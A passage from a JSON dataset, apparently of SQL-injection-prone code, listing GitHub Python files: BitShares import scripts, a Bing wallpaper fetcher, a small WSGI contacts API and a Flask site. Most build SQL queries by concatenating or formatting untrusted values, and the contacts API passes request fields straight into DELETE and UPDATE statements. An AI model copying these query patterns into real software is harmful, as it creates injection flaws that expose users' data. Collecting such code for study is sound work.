range(0, size):\n        symbol = all_assets[x][\"result\"][i][\"symbol\"]\n        asset_id = all_assets[x][\"result\"][i][\"id\"]\n\n        precision = 5\n        try:\n            data3 = api._get_asset(asset_id)\n            current_supply = data3[0][\"current_supply\"]\n            precision = data3[0][\"precision\"]\n            # print current_supply\n        except:\n            price = 0\n            continue\n\n        try:\n            holders = api._get_asset_holders_count(asset_id)\n            # print holders\n        except:\n            holders = 0\n            continue\n\n        if symbol == config.CORE_ASSET_SYMBOL:\n            type_ = \"Core Token\"\n        elif all_assets[x][\"result\"][i][\"issuer\"] == \"1.2.0\":\n            type_ = \"SmartCoin\"\n        else:\n            type_ = \"User Issued\"\n        #print all_assets[x][\"result\"][i]\n\n        try:\n            data = api._get_volume(config.CORE_ASSET_SYMBOL, symbol)\n        except:\n            continue\n\n        #print symbol\n        #print data[\"quote_volume\"]\n\n        try:\n            data2 = api._get_ticker(config.CORE_ASSET_SYMBOL, symbol)\n            price = data2[\"latest\"]\n            #print price\n\n            if str(price) == 'inf':\n               continue\n            #    exit\n\n            #print price\n        except:\n            price = 0\n            continue\n\n        mcap = int(current_supply) * float(price)\n\n        query = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype, precision) VALUES('\"+symbol+\"', '\"+asset_id+\"', '\"+price+\"', '\"+data['base_volume']+\"', '\"+str(mcap)+\"', '\"+type_+\"', '\"+str(current_supply)+\"', '\"+str(holders)+\"', '','\"+str(precision)+\"')\"\n        #query = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders) VALUES('\" + symbol + \"', '\" + asset_id + \"', '\" + price + \"', '0', '\" + str(mcap) + \"', '\" + type_ + \"', '\" + str(current_supply) + \"', '\" + str(holders) + \"')\"\n\n        print query\n        cur.execute(query)\n        con.commit()\n\n\n# with updated volume, add stats\nquery = \"select sum(volume) from assets WHERE aname!='BTS'\"\ncur.execute(query)\nresults = cur.fetchone()\nvolume = results[0]\n\nquery = \"select sum(mcap) from assets\"\ncur.execute(query)\nresults = cur.fetchone()\nmarket_cap = results[0]\n\nquery = \"INSERT INTO stats (type, value, date) VALUES('volume_bts', '\"+str(int(round(volume)))+\"', NOW())\"\nprint query\ncur.execute(query)\ncon.commit()\n\n\"\"\"query = \"INSERT INTO stats (type, value, date) VALUES('market_cap_bts', '\"+str(int(round(market_cap)))+\"', NOW())\" # out of range for bigint, fix.\nprint query\ncur.execute(query)\ncon.commit()\n\"\"\"\n\n# insert core token manually\ndata3 = api._get_asset(config.CORE_ASSET_ID)\ncurrent_supply = data3[0][\"current_supply\"]\n\nholders = api._get_asset_holders_count(config.CORE_ASSET_ID)\n\nmcap = int(current_supply)\n\nquery = \"INSERT INTO assets (aname, aid, price, volume, mcap, type, current_supply, holders, wallettype) VALUES('BTS', '1.3.0', '1', '\"+str(volume)+\"', '\"+str(mcap)+\"', 'Core Token', '\" + str(current_supply) + \"', '\" + str(holders) + \"', '')\"\ncur.execute(query)\ncon.commit()\n\ncur.close()\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_holders.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport os\nimport time\nimport urllib\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE holders\"\ncur.execute(query)\nquery = \"ALTER SEQUENCE holders_hid_seq RESTART WITH 1\"\ncur.execute(query)\ncon.commit()\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_count\",[]]}')\nresult = ws.recv()\nj = json.loads(result)\naccount_count = int(j[\"result\"])\n\nfor ac in range(0, account_count):\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.2.' + str(ac) + '\"]]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    try:\n        account_id = j[\"result\"][0][\"id\"]\n        account_name = j[\"result\"][0][\"name\"]\n    except:\n        continue\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_balances\",[\"' + account_id + '\", [\"1.3.0\"]]]}')\n    result3 = ws.recv()\n    jb = json.loads(result3)\n\n    if jb[\"result\"][0][\"amount\"] == 0:\n        continue\n    else:\n        amount = jb[\"result\"][0][\"amount\"]\n\n        # add total_core_in_orders to the sum\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"' + j[\"result\"][0][\"statistics\"] + '\"]]]}')\n        result = ws.recv()\n        js = json.loads(result)\n\n        try:\n            total_core_in_orders = js[\"result\"][0][\"total_core_in_orders\"]\n        except:\n            total_core_in_orders = 0\n\n        amount = int(amount) + int(total_core_in_orders)\n\n        voting_account = j[\"result\"][0][\"options\"][\"voting_account\"]\n        query = \"INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('\"+account_id+\"', '\"+account_name+\"','\"+str(amount)+\"', '\"+voting_account+\"')\"\n        cur.execute(query)\n        con.commit()\n\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_markets.py",
        "source": "#!/usr/bin/env python2\nimport json\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport api\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\nquery = \"TRUNCATE markets\"\ncur.execute(query)\n\nquery = \"ALTER SEQUENCE markets_id_seq RESTART WITH 1\"\ncur.execute(query)\n\ncon.commit()\n\nquery = \"SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC\"\ncur.execute(query)\nrows = cur.fetchall()\n\nfor row in rows:\n    all_assets = []\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"AAAAA\", 100]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    all_assets.append(j);\n\n    len_result = len(j[\"result\"])\n\n    while len_result == 100:\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"list_assets\",[\"'+j[\"result\"][99][\"symbol\"]+'\", 100]]}')\n        result = ws.recv()\n        j = json.loads(result)\n        len_result = len(j[\"result\"])\n        all_assets.append(j);\n\n    try:\n        for x in range (0, len(all_assets)):\n            for i in range(0, 100):\n\n                symbol =  all_assets[x][\"result\"][i][\"symbol\"]\n                id_ = all_assets[x][\"result\"][i][\"id\"]\n\n                try:\n                    data = api._get_volume(symbol, row[1])\n                    volume = data[\"base_volume\"]\n                except:\n                    volume = 0\n                    continue\n\n                try:\n                    data2 = api._get_ticker(symbol, row[1])\n                    price = data2[\"latest\"]\n                    #print price\n                except:\n                    price = 0\n                    continue\n\n                print row[1] + \" / \" + symbol + \" vol: \" + str(volume) + \" price: \" + str(price)\n                #if symbol == \"COMPUCEEDS\":\n                #    exit\n\n                # this was an attempt to sum up volume of not bts crosses to calculate total DEX volume, disabled by now(need better math to convert to bts)\n                \"\"\"\n                if float(data[\"base_volume\"]) > 0 and float(row[3]) > 0 and row[1] != \"BTS\" and symbol != \"BTS\":\n                    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + symbol + '\"], 0]]}')\n                    result_l = ws.recv()\n                    j_l = json.loads(result_l)\n                    base_id = j_l[\"result\"][0][\"id\"]\n                    base_precision = 10 ** float(j_l[\"result\"][0][\"precision\"])\n                    # print base_id\n\n                    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + row[1] + '\"], 0]]}')\n                    result_l = ws.recv()\n                    j_l = json.loads(result_l)\n                    # print j_l\n                    quote_id = j_l[\"result\"][0][\"id\"]\n                    quote_precision = 10 ** float(j_l[\"result\"][0][\"precision\"])\n\n                    print float(row[4])\n                    print float(data['base_volume'])\n                    print float(row[3])\n                    sum_volume = float(row[4]) + (float(data['base_volume']) * float(base_precision) / float(data['quote_volume']) * float(quote_precision)) / float(row[3])\n                    print sum_volume\n                    exit\n                    query_u = \"UPDATE assets SET volume='\"+str(sum_volume)+\"' WHERE id=\"+str(row[0])\n                    #print query_u\n                    cur.execute(query_u)\n                    con.commit()\n                \"\"\"\n\n                if float(price) > 0 and float(volume) > 0:\n                    query = \"INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('\"+row[1]+ \"/\" + symbol+\"', '\"+str(row[0])+\"', '\"+str(float(price))+\"', '\"+str(float(volume))+\"', '\"+row[2]+\"')\"\n                    print query\n                    cur.execute(query)\n                    con.commit()\n\n    except:\n        continue\n\n\ncur.close()\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_realtime_ops.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport thread\n\nimport psycopg2\nimport websocket\n\nimport api\nimport config\n\n\ndef on_message(ws, message):\n    #print(message)\n    j = json.loads(message)\n    try:\n        #print j[\"params\"][1][0][0][\"id\"]\n        id_ = j[\"params\"][1][0][0][\"id\"]\n        #print id_[:4]\n        if id_[:4] == \"2.9.\":\n            #print j[\"params\"][1][0][0]\n            data = api._get_object(id_)\n            #print data[0]\n            account_id = data[0][\"account\"]\n            data_a = api._account_name(account_id)\n\n            #print data_a[0][\"name\"]\n            account_name = data_a[0][\"name\"]\n\n            data2 = api._get_object(data[0]['operation_id'])\n            block_num = data2[0][\"block_num\"]\n\n            op_type = data2[0][\"op\"][0]\n\n            #print block_num\n            trx_in_block =  data2[0][\"trx_in_block\"]\n            op_in_trx =  data2[0][\"op_in_trx\"]\n\n            con = psycopg2.connect(**config.POSTGRES)\n            cur = con.cursor()\n            query = \"INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('\"+id_+\"', '\"+data[0][\"operation_id\"]+\"', '\"+str(block_num)+\"', '\"+str(trx_in_block)+\"', '\"+str(op_in_trx)+\"', NOW(), '\"+account_id+\"', '\"+str(op_type)+\"', '\"+account_name+\"')\"\n            print query\n            cur.execute(query)\n            con.commit()\n\n    except:\n        pass\n\n\ndef on_error(ws, error):\n    print(error)\n    #print \"\"\n\n\ndef on_close(ws):\n    print(\"### closed ###\")\n\n\ndef on_open(ws):\n    def run(*args):\n        ws.send('{\"method\": \"call\", \"params\": [1, \"database\", []], \"id\": 3}')\n        ws.send('{\"method\": \"call\", \"params\": [2, \"set_subscribe_callback\", [5, true]], \"id\": 6}')\n\n    thread.start_new_thread(run, ())\n\n\nif __name__ == \"__main__\":\n    websocket.enableTrace(True)\n    ws = websocket.WebSocketApp(config.WEBSOCKET_URL,\n                                on_message=on_message,\n                                on_error=on_error,\n                                on_close=on_close)\n    ws.on_open = on_open\n\n    ws.run_forever()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/bitshares/bitshares-explorer-api/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/postgres/import_referrers.py",
        "source": "#!/usr/bin/env python2\nimport json\nimport os\nimport time\nimport urllib\n\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\ncon = psycopg2.connect(**config.POSTGRES)\ncur = con.cursor()\n\n\n#query = \"TRUNCATE referrers\"\n#cur.execute(query)\n#query = \"ALTER SEQUENCE referrers_rid_seq RESTART WITH 1\"\n#cur.execute(query)\n#con.commit()\n\nquery = \"SELECT rid FROM referrers ORDER BY rid DESC LIMIT 1\"\ncur.execute(query)\nin_database = cur.fetchone() or [0]\n\nws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_account_count\",[]]}')\nresult = ws.recv()\nj = json.loads(result)\naccount_count = int(j[\"result\"])\n\nprint account_count\n\nfor ac in range(in_database[0], account_count):\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"1.2.' + str(ac) + '\"]]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    try:\n        account_id = j[\"result\"][0][\"id\"]\n        account_name = j[\"result\"][0][\"name\"]\n\n        referrer = j[\"result\"][0][\"referrer\"]\n        referrer_rewards_percentage = j[\"result\"][0][\"referrer_rewards_percentage\"]\n        lifetime_referrer = j[\"result\"][0][\"lifetime_referrer\"]\n        lifetime_referrer_fee_percentage = j[\"result\"][0][\"lifetime_referrer_fee_percentage\"]\n\n        print account_id\n        print referrer\n        print lifetime_referrer\n        print \"\"\n\n        query = \"INSERT INTO referrers (account_id, account_name, referrer, referrer_rewards_percentage, lifetime_referrer, lifetime_referrer_fee_percentage) \" \\\n                \"VALUES('\"+account_id+\"', '\"+account_name+\"','\"+referrer+\"', '\"+str(referrer_rewards_percentage)+\"','\"+lifetime_referrer+\"', '\"+str(lifetime_referrer_fee_percentage)+\"')\"\n        cur.execute(query)\n        con.commit()\n\n    except:\n        continue\n\ncon.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/haozhigh/py_utilities/blob/ab5b962a4d4ca3d45d28651dee795c530c04c457",
        "file_path": "/bing_desktop/update.py",
        "source": "\nimport sys\nimport os\n\nimport sqlite3\nimport requests\nfrom PIL import Image\nfrom io import BytesIO\n\nfrom configs import *\n\n\nNUM_IMAGES_TO_GET = 10\n\ndef main():\n    global NUM_IMAGES_TO_GET\n\n    # parse commandline arguments\n    if len(sys.argv) > 1:\n        NUM_IMAGES_TO_GET = int(sys.argv[1])\n\n    # assert python version is 3\n    if sys.version_info.major < 3:\n        print(\"This script only runs in python3\")\n        return\n\n    # create data directory\n    data_dir = \"./data\"\n    if not os.path.isdir(data_dir):\n        os.makedirs(data_dir)\n        if not os.path.isdir(data_dir):\n            print(\"Failed to create data path '{}'\".format(data_dir))\n            return\n    image_dir = os.path.join(data_dir, \"{}_{}\".format(resolution_width, resolution_height))\n    if not os.path.isdir(image_dir):\n        os.makedirs(image_dir)\n        if not os.path.isdir(image_dir):\n            print(\"Failed to create image path '{}'\".format(image_dir))\n            return\n\n    # open db\n    conn = sqlite3.connect(\"./data/data.db\")\n\n    # get cursor\n    c = conn.cursor()\n\n    # create table\n    c.execute('''\n        select name from sqlite_master\n        where type='table' and name='wallpapers'\n        ''')\n    if c.fetchone() == None:\n        c.execute('''\n            create table wallpapers (\n                id integer primary key autoincrement not null,\n                image_date text not null,\n                url_base text not null,\n                copyright text not null)\n            ''')\n\n    idx = 0\n    while idx <= NUM_IMAGES_TO_GET:\n        list_url = \"https://www.bing.com/HPImageArchive.aspx?format=js&idx={}&n=1&mkt=en-US\".format(idx)\n        print(\"Getting iamge list from '{}'\".format(list_url))\n        r = requests.get(list_url)\n        if r.status_code != requests.codes.ok:\n            print(\"Failed to get url '{}'\".format(list_url))\n            break\n\n        j = r.json()\n        image_date = j['images'][0]['startdate']\n        url_base = j['images'][0]['urlbase']\n        url = j['images'][0]['url']\n        copyright = j['images'][0]['copyright']\n\n        c.execute('''\n            select * from wallpapers\n            where image_date='{}'\n            '''.format(image_date))\n        if c.fetchone() == None:\n            c.execute('''\n                insert into wallpapers (image_date, url_base, copyright)\n                values ('{}', '{}', '{}')\n                '''.format(image_date, url_base, copyright))\n            print(\"## Inserted image {} to database ##\".format(image_date))\n\n        image_path = os.path.join(image_dir, \"{}.jpg\".format(image_date))\n        if not os.path.isfile(image_path):\n            image_url = \"https://www.bing.com{}_{}x{}.jpg\".format(url_base, resolution_width, resolution_height)\n            print(\"## Downloading image from '{}'\".format(image_url))\n            r_image = requests.get(image_url)\n            if r_image.status_code != requests.codes.ok:\n                print(\"Failed to get url '{}'\".format(image_url))\n                break\n            image = Image.open(BytesIO(r_image.content))\n            image.save(image_path)\n            print(\"## Downloaded image {} ##\".format(image_path))\n\n        idx += 1\n\n    # insert record\n    #c.execute('''\n    #    insert into wallpapers (image_date, url_base, copyright)\n    #    values ('aa', 'bb', 'cc')\n    #    ''')\n\n    # query records\n    ##c.execute(\"select * from wallpapers order by id desc limit 0,10\")\n    ##print(c.fetchall())\n\n    # commit connection changes\n    conn.commit()\n\n    # close cursor and db\n    c.close()\n    conn.close()\n\n\nif __name__ == \"__main__\":\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/arturgoms/Teste-Tecnico/blob/b14e640b5c15d04a02e13c2c00e4d4452ff4f0a5",
        "file_path": "/src/controllers/api.py",
        "source": "\"\"\" Api Controller\n\n    Arquivo onde se encontra toda a lgica que rodar na rota '/api'\n\nTodo:\n\n    None\n\n\"\"\"\n\nimport cgi\nimport json\nimport src.models.mysql as mysql\n\ndef getFields(environ):\n        \"\"\"\n        getFields function:\n            retorna os campos que chegam pelos mtodos POST DELETE PUT\n        \"\"\"\n        data_env = environ.copy()\n        data_env['QUERY_STRING'] = ''\n        data = cgi.FieldStorage(\n            fp=environ['wsgi.input'],\n            environ=data_env,\n            keep_blank_values=True\n        )\n        return data\n\ndef api(environ, start_response):\n    \"\"\"\n        api function:\n            Lgica para a rota api\n    \"\"\"\n    \n    # Mtodo POST, adiciona um contato no banco\n    if environ['REQUEST_METHOD'] == 'POST':\n        try:\n            post = getFields(environ)\n            db = mysql.MySQL()\n            db.insert('users', {\"nome\":post['nome'].value, \"sobrenome\":post['sobrenome'].value, \"endereco\":post['endereco'].value })\n            start_response('200 OK', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"true\"}))]\n        except Exception as e:\n            start_response('500 ERROR', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"false\",\"error\": 500,\"method\": \"POST\", \"msg\": \"No foi possvel adicionar contato\"}))]\n\n    # Mtodo DELETE, deleta um contato do banco\n    if environ['REQUEST_METHOD'] == 'DELETE':\n        try:\n            delete = getFields(environ)\n            db = mysql.MySQL()\n            db.delete_where('users', 'id = {}'.format(delete['id'].value))\n            start_response('200 OK', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"true\"}))]\n        except Exception as e:\n            start_response('500 ERROR', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"false\",\"error\": 500,\"method\": \"DELETE\", \"msg\": \"No foi possvel deletar contato\"}))]\n        \n    # Mtodo PUT, atualiza um contato \n    if environ['REQUEST_METHOD'] == 'PUT':\n        try:\n            put = getFields(environ)\n            db = mysql.MySQL()\n            db.update_where('users',\"nome = '\"+ put['nome'].value +\"', sobrenome = '\"+ put['sobrenome'].value +\"', endereco = '\"+ put['endereco'].value + \"'\", 'id = ' + put['id'].value)\n            start_response('200 OK', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"true\"}))]\n        except Exception as e:\n            start_response('500 ERROR', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"false\",\"error\": 500,\"method\": \"PUT\", \"msg\": \"No foi possvel atualizar contato\"}))]\n\n    # Mtodo GET, retorna todos os contatos no banco\n    if environ['REQUEST_METHOD'] == 'GET':\n        try:\n            db = mysql.MySQL()\n            json_data = db.select('users')\n            html = str.encode(json.dumps(json_data))\n            start_response('200 OK', [('Content-Type', 'text/json')])\n            return [html]\n        except Exception as e:\n            start_response('500 ERROR', [('Content-Type', 'text/json')])\n            return [str.encode(json.dumps({\"success\":\"false\",\"error\": 500,\"method\": \"GET\", \"msg\": \"No foi possvel retornar tabela\"}))]",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/arturgoms/Teste-Tecnico/blob/b14e640b5c15d04a02e13c2c00e4d4452ff4f0a5",
        "file_path": "/src/models/mysql.py",
        "source": "\"\"\" mysql File\n\n    Arquivo onde se encontra todas as funes para trabalhar com o db\nTodo:\n\n    None\n\n\"\"\"\n\nimport json\nimport mysql.connector as mysql\nimport src.settings as conf\n\nclass MySQL():\n\t\"\"\"\n        MySQL class:\n           \tTodas as funes para manipulao do DB\n    \"\"\"\n\tdef __init__(self):\n\t\tself.__connection = mysql.connect(**conf.DATABASE)\n\t\tself.cursor = self.__connection.cursor()\n\n\tdef execute(self, query):\n\t\t\"\"\"\n        \texecute function:\n           \t\tExecuta a query com tratamento de error\n    \t\"\"\"\n\t\ttry:\n\t\t\tself.cursor.execute(query)\n\t\texcept mysql.Error as error:\n\t\t\tprint(\"Error: {}\".format(error))\n\t\treturn self.cursor\n\n\tdef select(self, table):\n\t\t\"\"\"\n        \tselect function:\n           \t\tRetorna todos os dados da tabela em formato JSON\n    \t\"\"\"\n\t\taux_dict = dict()\n\t\tself.cursor.execute(\"SELECT * FROM {0}\".format( table))\n\t\tjson_data = {}\n\t\tfor user in self.cursor:\n\t\t\tjson_data[str(user[3])] = {}\n\t\t\tjson_data[str(user[3])]['nome'] = user[0]\n\t\t\tjson_data[str(user[3])]['sobrenome'] = user[1]\n\t\t\tjson_data[str(user[3])]['endereco'] = user[2]\n\t\treturn json.dumps(json_data)\n\n\tdef insert(self, table, content):\n\t\t\"\"\"\n        \tinsert function:\n           \t\tRecebe em JSON os dados e grava na tabela\n    \t\"\"\"\n\t\tnome = content[\"nome\"]\n\t\tsobrenome = content[\"sobrenome\"]\n\t\tendereco = content[\"endereco\"]\n\t\tadd_user = \"\"\"INSERT INTO users (nome, sobrenome, endereco) VALUES (%s,%s,%s)\"\"\"\n\n\t\tdata_user = (nome, sobrenome, endereco)\n\t\ttry:\n\t\t    self.cursor.execute(add_user,data_user)\n\t\texcept mysql.Error as error:\n\t\t    print(\"Error: {}\".format(error))\n\t\tself.__connection.commit()\n\t\tself.cursor.lastrowid\n\n\tdef delete_where(self, table, where):\n\t\t\"\"\"\n        \tdelete_where function:\n           \t\tDeleta um campo especifico da tabela\n    \t\"\"\"\n\t\ttry:\n\t\t    self.cursor.execute(\"DELETE FROM {0} WHERE {1}\".format(table, where))\n\t\texcept mysql.Error as error:\n\t\t    print(\"Erro: {}\".format(error))\n\t\tself.__connection.commit()\n\t\treturn self.cursor\n\n\n\tdef update_where(self, table, info, where):\n\t\t\"\"\"\n        \tupdate_where function:\n           \t\tAtualiza um campo especfico da tabela\n    \t\"\"\"\n\t\ttry:\n\t\t    self.cursor.execute(\"UPDATE {0} SET {1} WHERE {2}\".format(table, info, where))\n\t\texcept mysql.Error as error:\n\t\t    print(\"Erro: {}\".format(error))\n\t\tself.__connection.commit()\n\t\treturn self.cursor\n\n\tdef close(self):\n\t\t\"\"\"\n        \tclose function:\n           \t\tfecha a conexao com o banco\n    \t\"\"\"\n\t\tself.__connection.close()\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/frankiebaffa/mysite-flask/blob/8b1a9e7ba1ef15165318adc7e2050881f4a0ceea",
        "file_path": "/mysite/app/routes.py",
        "source": "from app import app, db, models\nfrom app.models import Article, User, Post, Project\nfrom flask import Flask, render_template, redirect, flash, request\nfrom flask_login import current_user, login_user, logout_user\nfrom app.forms import LoginForm, ArticleCreateForm, PostCreateForm\nfrom werkzeug.urls import url_parse\nimport sqlite3\n\ndef get_table_dict(table):\n    database = sqlite3.connect('app.db')\n    cur = database.execute('select * from {} order by timestamp desc'.format(table))\n    columns = [column[0] for column in cur.description]\n    results = []\n    for row in cur.fetchall():\n        results.append(dict(zip(columns, row)))\n    return results\n\n@app.route('/')\n@app.route('/index')\n@app.route('/index/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/articles')\n@app.route('/articles/')\ndef articles():\n    results = get_table_dict('Article')\n    return render_template('articles.html', allarticles=results)\n\n@app.route('/login', methods=['GET', 'POST'])\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    if current_user.is_authenticated:\n        return redirect('/manage')\n    form = LoginForm()\n    if form.validate_on_submit():\n        user = User.query.filter_by(username=form.username.data).first()\n        if user is None or not user.check_password(form.password.data):\n            flash('Invalid username or password')\n            return redirect('/login')\n        login_user(user, remember=form.remember_me.data)\n        next_page = request.args.get('next')\n        if not next_page or url_parse(next_page).netloc != '':\n            next_page = '/manage'\n        return redirect(next_page)\n    return render_template('login.html', title='Sign In', form=form)\n\n@app.route('/aboutme')\n@app.route('/aboutme/')\ndef aboutme():\n    return render_template('aboutme.html')\n\n#==============================================================================\n#   External redirects\n#==============================================================================\n\n@app.route('/nominal')\n@app.route('/nominal/')\ndef nominal():\n    return redirect('https://soundcloud.com/iamnominal')\n\n@app.route('/dds')\n@app.route('/dds/')\ndef dds():\n    return redirect('https://soundcloud.com/doobiedecibelsystem')\n\n@app.route('/podcast')\n@app.route('/podcast/')\ndef podcast():\n    return redirect('http://soundcloud.com/letsbefrankpodcast')\n\n#==============================================================================\n#   All routes beneath must have user authenticated\n#==============================================================================\n\n@app.route('/manage')\n@app.route('/manage/')\ndef manage():\n    if current_user.is_authenticated:\n        return render_template('manage.html')\n    else:\n        return redirect('/index')\n\n@app.route('/manage/articles', methods=['GET', 'POST'])\n@app.route('/manage/articles/', methods=['GET', 'POST'])\ndef managearticles():\n    if current_user.is_authenticated:\n        createform = ArticleCreateForm()\n        if createform.validate_on_submit():\n            article = Article(body=createform.body.data, url=createform.url.data,\n                imageurl=createform.imageurl.data, author=current_user)\n            db.session.add(article)\n            db.session.commit()\n            flash('Posted!')\n            return redirect('/manage/articles')\n        results = get_table_dict('Article')\n        return render_template('managearticles.html', title='Manage Articles',\n            createform=createform, items=results)\n    else:\n        return redirect('/index')\n\n@app.route('/manage/posts', methods=['GET', 'POST'])\n@app.route('/manage/posts/', methods=['GET', 'POST'])\ndef manageposts():\n    if current_user.is_authenticated:\n        createform = PostCreateForm()\n        if createform.validate_on_submit():\n            post = Post(title=createform.title.data, body=createform.body.data,\n                imageurl=createform.imageurl.data, author=current_user)\n            db.session.add(post)\n            db.session.commit\n            flash('Posted!')\n            return redirect('/manage/posts')\n        results = get_table_dict('Post')\n        return render_template('manageposts.html', title='Manage Posts',\n            createform=createform, items=results)\n    else:\n        return redirect('/index')\n\n@app.route('/manage/articles/delete', methods=['POST'])\ndef deletearticle():\n    if current_user.is_authenticated:\n        body = request.form.get(\"body\")\n        article = Article.query.filter_by(body=body).first()\n        db.session.delete(article)\n        db.session.commit()\n        return redirect(\"/manage/articles\")\n    else:\n        return redirect(\"/index\")\n\n@app.route('/manage/posts/delete', methods=['POST'])\ndef deletepost():\n    if current_user.is_authenticated:\n        title = request.form.get(\"title\")\n        post = Post.query.filter_by(title=title).first()\n        db.session.delete(post)\n        db.session.commit()\n        return redirect(\"/manage/posts\")\n    else:\n        return redirect(\"/index\")\n\n@app.route('/manage/articles/update', methods=['POST'])\ndef updatearticle():\n    if current_user.is_authenticated:\n        newbody = request.form.get(\"newbody\")\n        oldbody = request.form.get(\"oldbody\")\n        newurl = request.form.get(\"newurl\")\n        newimageurl = request.form.get(\"newimageurl\")\n        article = Article.query.filter_by(body=oldbody).first()\n        article.body = newbody\n        article.url = newurl\n        article.imageurl = newimageurl\n        db.session.commit()\n        return redirect(\"/manage/articles\")\n    else:\n        return redirect(\"/index\")\n\n@app.route('/logout')\n@app.route('/logout/')\ndef logout():\n    if current_user.is_authenticated:\n        logout_user()\n        return redirect('/index')\n    else:\n        return redirect('/index')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/cms_scanner_core.py",
        "source": "import os\nimport logging\nimport sys\nfrom detector import CMSDetector\n\nclass CustomModuleLoader:\n    folder = \"\"\n    blacklist = ['cms_scanner.py', '__init__.py']\n    modules = []\n    logger = None\n    is_aggressive = False\n    module = None\n\n    def __init__(self, folder='scanners', blacklist=[], is_aggressive=False, log_level=logging.INFO):\n        self.blacklist.extend(blacklist)\n        self.folder = os.path.join(os.path.dirname(__file__), folder)\n        self.logger = logging.getLogger(\"CMS Scanner\")\n        self.logger.setLevel(log_level)\n        ch = logging.StreamHandler(sys.stdout)\n        ch.setLevel(log_level)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        ch.setFormatter(formatter)\n        self.logger.addHandler(ch)\n        self.logger.debug(\"Loading CMS scripts\")\n        self.is_aggressive = is_aggressive\n\n    def load(self, script, name):\n        sys.path.insert(0, os.path.dirname(__file__))\n        base = script.replace('.py', '')\n        try:\n            command_module = __import__(\"scanners.%s\" % base, fromlist=[\"scanners\"])\n            module = command_module.Scanner()\n            if module.name == name:\n                self.module = module\n                self.module.set_logger(self.logger.getEffectiveLevel())\n                self.logger.debug(\"Selected %s for target\" % name)\n        except ImportError as e:\n            self.logger.warning(\"Error importing script:%s %s\" % (base, str(e)))\n        except Exception as e:\n            self.logger.warning(\"Error loading script:%s %s\" % (base, str(e)))\n\n    def load_modules(self, name):\n        for f in os.listdir(self.folder):\n            if not f.endswith('.py'):\n                continue\n            if f in self.blacklist:\n                continue\n            self.load(f, name)\n\n    def run_scripts(self, base, headers={}, cookies={}):\n        p = CMSDetector()\n        cms = p.scan(base)\n        if cms:\n            self.logger.debug(\"Detected %s as active CMS\" % cms)\n            self.load_modules(cms)\n            if self.module:\n                results = self.module.run(base)\n                return {cms: results}\n            else:\n                self.logger.warning(\"No script was found for CMS %s\" % cms)\n        else:\n            self.logger.info(\"No cms was detected on target %s\" % base)\n        return None\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/scanners/cms_scanner.py",
